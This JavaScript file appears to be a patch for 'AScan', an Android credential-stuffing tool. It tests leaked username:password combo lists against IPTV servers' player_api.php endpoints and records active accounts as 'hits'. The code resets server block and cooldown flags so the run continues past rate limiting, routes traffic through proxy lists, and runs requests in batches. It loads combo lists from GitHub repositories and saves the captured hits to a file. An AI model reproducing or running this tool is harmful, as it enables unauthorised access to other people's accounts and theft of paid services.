(function(){
  if(window.__ascanFixV119) return; window.__ascanFixV119=1;
  function tmsg(m){ try{ if(typeof toast==='function') toast(m); }catch(e){} }
  function hasNative(){ return !!(window.AScanNative && typeof AScanNative.httpGet==='function'); }
  function proxyCount(){
    try{ if(hasNative()&&AScanNative.getProxyStatus){ var st=JSON.parse(AScanNative.getProxyStatus()); return st.count|0; } }catch(e){}
    return 0;
  }

  window.__ascanCbMap=window.__ascanCbMap||{};
  window.__ascanCb=function(id,b64){
    var cb=window.__ascanCbMap[id]; if(!cb) return; delete window.__ascanCbMap[id];
    try{cb(b64);}catch(e){}
  };
  function b64ToUtf8(b64){
    try{var bin=atob(b64);var bytes=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);return new TextDecoder('utf-8').decode(bytes);}
    catch(e){try{return decodeURIComponent(escape(atob(b64)));}catch(e2){return '';}}
  }
  function nativeHttpAsync(url,timeoutMs){
    return new Promise(function(resolve){
      if(!(window.AScanNative&&AScanNative.httpGetAsync)){resolve({ok:false,status:0,error:'no async',body:''});return;}
      var id='c'+Date.now().toString(36)+Math.random().toString(36).slice(2,8);
      var done=false;
      var timer=setTimeout(function(){if(done)return;done=true;delete window.__ascanCbMap[id];resolve({ok:false,status:0,error:'timeout',body:''});},(timeoutMs|0)+8000);
      window.__ascanCbMap[id]=function(b64){if(done)return;done=true;clearTimeout(timer);try{resolve(JSON.parse(b64ToUtf8(b64)));}catch(e){resolve({ok:false,status:0,error:String(e),body:''});}};
      try{AScanNative.httpGetAsync(url,timeoutMs|0,id);}catch(e){if(done)return;done=true;clearTimeout(timer);resolve({ok:false,status:0,error:String(e),body:'';});}
    });
  }

  if(typeof fetchText==='function'){
    var _ft=fetchText;
    window.fetchText=async function(url,ms){
      if(hasNative()){try{var j=JSON.parse(AScanNative.httpGet(url,ms||25000));if(j&&j.ok)return j.body||'';}catch(e){}}
      return _ft(url,ms);
    };
  }

  if(typeof testarNoServidor==='function'){
    var _tn=testarNoServidor;
    window.testarNoServidor=async function(cred,servidor){
      if(hasNative() && AScanNative.httpGetAsync){
        var api=servidor.url+'/player_api.php?username='+encodeURIComponent(cred.user)+'&password='+encodeURIComponent(cred.pass);
        try{
          var j=await nativeHttpAsync(api,8000);
          if(window.state&&!state.isScanRunning)return{status:'stopped'};
          if(!j||j.status===0)return{status:'error',errorType:'connection'};
          if(j.status===429||j.status===403)return{status:'error',errorType:'connection'};
          if(!j.ok||j.status!==200)return{status:'invalida'};
          var data;try{data=JSON.parse(j.body||'');}catch(e){return{status:'invalida'};}
          if(!data||!data.user_info)return{status:'invalida'};
          if(String(data.user_info.status||'').toLowerCase()==='active')return{status:'hit',data:data};
          return{status:'invalida'};
        }catch(e){return{status:'error',errorType:'connection'};}
      }
      return _tn(cred,servidor);
    };
  }

  if(typeof processarCredencial==='function'){
    var _pc=processarCredencial;
    window.processarCredencial=async function(cred){
      try{
        if(window.state&&state.servers){
          state.servers.forEach(function(s){ s.blocked=false; s.blockRetries=0; s.coolDownUntil=0; });
        }
      }catch(e){}
      var r=await _pc(cred);
      try{
        if(window.state&&state.servers){
          state.servers.forEach(function(s){ s.blocked=false; s.coolDownUntil=0; });
        }
      }catch(e){}
      return r;
    };
  }

  if(typeof workerTurbo==='function'){
    window.workerTurbo=async function(){
      while(state.comboLines.length>0&&state.isScanRunning){
        var ok=state.servers.some(function(s){return !s.blocked&&Date.now()>s.coolDownUntil;});
        if(!ok&&state.servers.length){ await new Promise(function(r){setTimeout(r,50);}); updateStatusBar(); continue; }
        var batch=state.comboLines.splice(0,Math.min(5,state.comboLines.length));
        await Promise.all(batch.map(function(c){return processarCredencial(c);}));
        await new Promise(function(r){setTimeout(r,0);});
      }
    };
  }

  if(typeof getComboText==='function'){
    window.getComboText=async function(){
      try{var f=document.getElementById('combo');if(f&&f.files&&f.files[0])return await f.files[0].text();}catch(e){}
      try{if(typeof loadedComboText!=='undefined'&&loadedComboText)return loadedComboText;}catch(e){}
      try{
        var sel=document.getElementById('combo-online-select');
        if(sel&&sel.value!==''&&typeof loadSelectedOnlineCombo==='function'){
          var t=await loadSelectedOnlineCombo(); if(t) return t;
        }
      }catch(e){}
      return null;
    };
  }

  function rebind(sel,fn){
    var el=document.querySelector(sel); if(!el||!el.parentNode)return;
    var n=el.cloneNode(true); el.parentNode.replaceChild(n,el);
    n.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();fn();});
  }

  (function ensureProxyCard(){
    var old=document.getElementById('ascan-proxy-card');
    if(old&&old.parentNode) old.parentNode.removeChild(old);
    var actions=document.querySelector('.actions')||document.querySelector('.btn-start')&&document.querySelector('.btn-start').parentNode;
    var host=actions?actions.parentNode:document.body;
    var card=document.createElement('div');
    card.className='card';
    card.id='ascan-proxy-card';
    card.innerHTML='<div class="card-title">Proxy</div>'
      +'<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">'
      +'<button type="button" class="btn btn-online" id="btn-proxy-online" style="flex:1;min-width:90px">Online</button>'
      +'<button type="button" class="btn btn-ghost" id="btn-proxy-offline" style="flex:1;min-width:90px">Offline</button>'
      +'<button type="button" class="btn btn-ghost" id="btn-proxy-clear" style="flex:1;min-width:90px">Limpar</button>'
      +'</div>'
      +'<div class="field"><label>Cole proxies offline (host:port)</label>'
      +'<textarea id="proxy-paste" rows="3" placeholder="1.2.3.4:8080" style="width:100%;background:var(--surface2,#1a1a24);color:var(--text,#fff);border:1px solid var(--border,#333);border-radius:9px;padding:10px;font-family:monospace;font-size:0.75rem"></textarea></div>'
      +'<div id="proxy-status" class="combo-status" style="margin-top:8px">Sem proxy (direto)</div>';
    if(actions) host.insertBefore(card, actions); else host.appendChild(card);
  })();

  function refreshProxyStatus(){
    var el=document.getElementById('proxy-status'); if(!el)return;
    try{
      if(hasNative()&&AScanNative.getProxyStatus){
        var st=JSON.parse(AScanNative.getProxyStatus());
        el.textContent=st.count>0?('Proxy ON \u00b7 '+st.count):'Sem proxy (direto)';
        el.style.color=st.count>0?'#4ade80':'';
        return;
      }
    }catch(e){}
    el.textContent='Sem proxy (direto)';
  }

  var bo=document.getElementById('btn-proxy-online'),bf=document.getElementById('btn-proxy-offline'),bc=document.getElementById('btn-proxy-clear');
  if(bo)bo.onclick=function(){
    if(!hasNative()||!AScanNative.loadProxiesOnline){tmsg('Bridge ausente');return;}
    tmsg('Baixando proxies (20-40s)...');
    setTimeout(function(){try{var n=AScanNative.loadProxiesOnline();refreshProxyStatus();tmsg(n>0?('OK '+n+' proxies'):'Nenhum');}catch(e){tmsg('Erro '+e);}},50);
  };
  if(bf)bf.onclick=function(){
    var t=((document.getElementById('proxy-paste')||{}).value||'').trim();
    if(!t){tmsg('Cole host:port');return;}
    if(!hasNative()||!AScanNative.loadProxiesFromText){tmsg('Bridge ausente');return;}
    try{var n=AScanNative.loadProxiesFromText(t);refreshProxyStatus();tmsg(n>0?('OK '+n+' offline'):'Invalido');}catch(e){tmsg('Erro');}
  };
  if(bc)bc.onclick=function(){
    try{if(hasNative()&&AScanNative.clearProxies)AScanNative.clearProxies();}catch(e){}
    var el=document.getElementById('proxy-paste'); if(el) el.value='';
    refreshProxyStatus(); tmsg('Proxies limpos');
  };

  rebind('.btn-start', function(){
    try{
      var srv=(document.getElementById('servidorUnico')||{}).value||'';
      if(!String(srv).trim()){tmsg('Preencha o servidor!');return;}
      if(typeof startAttack!=='function'){tmsg('startAttack ausente');return;}
      try{if(window.state&&state.servers){state.servers.forEach(function(s){s.blocked=false;s.blockRetries=0;s.coolDownUntil=0;});}}catch(e){}
      var pc=proxyCount();
      tmsg(pc>0?('Iniciando com '+pc+' proxies...'):'Iniciando (direto, sem proxy)...');
      var p=startAttack();
      if(p&&p.catch)p.catch(function(err){tmsg('Erro: '+err);});
    }catch(err){tmsg('Erro: '+err);}
  });

  function allRaws(){
    try{ if(typeof getAllRaws==='function') return getAllRaws();
      var all=[]; if(window.state&&state.hitsLog){ for(var s in state.hitsLog) all=all.concat(state.hitsLog[s]); }
      return all; }catch(e){ return []; }
  }
  rebind('.btn-copy',function(){
    var h=allRaws(); if(!h.length){tmsg('Nenhum HIT');return;}
    var t=h.join(String.fromCharCode(10,10));
    if(navigator.clipboard)navigator.clipboard.writeText(t).then(function(){tmsg('Copiado!');});
  });
  rebind('#btn-download',function(){
    var h=allRaws(); if(!h.length){tmsg('Nenhum HIT');return;}
    var text=String.fromCharCode(0xFEFF)+h.join(String.fromCharCode(10,10));
    var name='hits_AScan_'+(new Date().toISOString().slice(0,10))+'.txt';
    if(AScanNative&&AScanNative.saveText){ AScanNative.saveText(name,text); tmsg('Salvo Downloads/'+name); }
  });

  window.COMBO_LIST_URL = 'https://raw.githubusercontent.com/StartStatic1/AScan-Android/main/combo/lista.txt';
  window.loadOnlineComboList = async function(){
    var sel=$('combo-online-select'), btn=$('btn-combo-online'), st=$('combo-status');
    if(!sel||!btn){ tmsg('UI combo ausente'); return; }
    btn.disabled=true; st.textContent='Buscando combos...'; st.className='combo-status loading';
    onlineCombos=[];
    var nameMap={};
    function prettyName(filename,url){
      var f=(filename||'').toLowerCase();
      if(nameMap[f]) return nameMap[f];
      if(url&&nameMap[url]) return nameMap[url];
      var n=(filename||url||'Combo').replace(/\.txt$/i,'').replace(/^combo[_-]?/i,'');
      if(/^\d+$/.test(n)) return 'Combo '+n;
      return n? (n.charAt(0).toUpperCase()+n.slice(1)) : 'Combo';
    }
    function norm(u){
      u=(u||'').trim(); if(!u) return '';
      var blob=u.match(/github\.com\/([^/]+)\/([^/]+)\/blob\/([^/]+)\/(.+)/i);
      if(blob) return 'https://raw.githubusercontent.com/'+blob[1]+'/'+blob[2]+'/'+blob[3]+'/'+blob[4];
      return u;
    }
    async function loadLista(url){
      try{
        var texto=await fetchText(url, 12000);
        texto.split(/\r?\n/).map(function(l){return l.trim();}).filter(function(l){return l&&l.indexOf('#')!==0;}).forEach(function(line){
          if(line.indexOf('|')<0) return;
          var p=line.split('|'); var name=(p[0]||'').trim(); var u=norm((p[1]||'').trim());
          if(!u) return;
          var file=(u.split('/').pop()||'').toLowerCase();
          nameMap[file]=name; nameMap[u]=name;
          onlineCombos.push({name:name,url:u});
        });
      }catch(e){}
    }
    async function loadApi(owner,repo,path){
      try{
        var api='https://api.github.com/repos/'+owner+'/'+repo+'/contents/'+(path||'');
        var raw=hasNative()? AScanNative.httpGet(api,15000) : null;
        var files;
        if(raw){ try{ var j=JSON.parse(raw); if(j&&j.ok&&j.body) files=JSON.parse(j.body); }catch(e){} }
        if(!files){
          var res=await fetch(api,{cache:'no-store',headers:{Accept:'application/vnd.github+json'}});
          if(res.ok) files=await res.json();
        }
        if(!Array.isArray(files)) return;
        files.forEach(function(f){
          if(!f||f.type!=='file'||!/\.txt$/i.test(f.name||'')||f.name.toLowerCase()==='lista.txt'||!f.download_url) return;
          var url=f.download_url;
          if(onlineCombos.some(function(c){return c.url===url;})) return;
          onlineCombos.push({name:prettyName(f.name,url),url:url});
        });
      }catch(e){}
    }
    try{
      await loadLista(window.COMBO_LIST_URL);
      await loadApi('StartStatic1','AScan-Android','combo');
      if(!onlineCombos.length){
        await loadLista('https://raw.githubusercontent.com/StartStatic1/AScan-Combos/main/lista.txt');
        await loadApi('StartStatic1','AScan-Combos','');
      }
      var seen={};
      onlineCombos=onlineCombos.filter(function(c){
        var k=(c.url||'').toLowerCase(); if(!k||seen[k]) return false; seen[k]=1; return true;
      });
      if(!onlineCombos.length) throw new Error('Nenhum combo online');
      sel.innerHTML='<option value="">Selecione...</option>';
      onlineCombos.forEach(function(c,i){
        var o=document.createElement('option'); o.value=String(i); o.textContent=c.name; sel.appendChild(o);
      });
      sel.classList.remove('hidden');
      st.textContent='OK '+onlineCombos.length+' combo(s)';
      st.className='combo-status ok';
      tmsg(onlineCombos.length+' combo(s) online');
      if(onlineCombos.length===1){ sel.value='0'; if(typeof loadSelectedOnlineCombo==='function') await loadSelectedOnlineCombo(); }
    }catch(e){
      onlineCombos=[]; sel.classList.add('hidden');
      st.textContent='Erro: '+(e.message||''); st.className='combo-status err';
    }finally{ btn.disabled=false; }
  };
  try{
    var bco=document.getElementById('btn-combo-online');
    if(bco){ bco.onclick=function(e){ e&&e.preventDefault(); loadOnlineComboList(); }; }
  }catch(e){}

  refreshProxyStatus();
  if(hasNative()) tmsg('AScan 1.1.9 OK');
})();
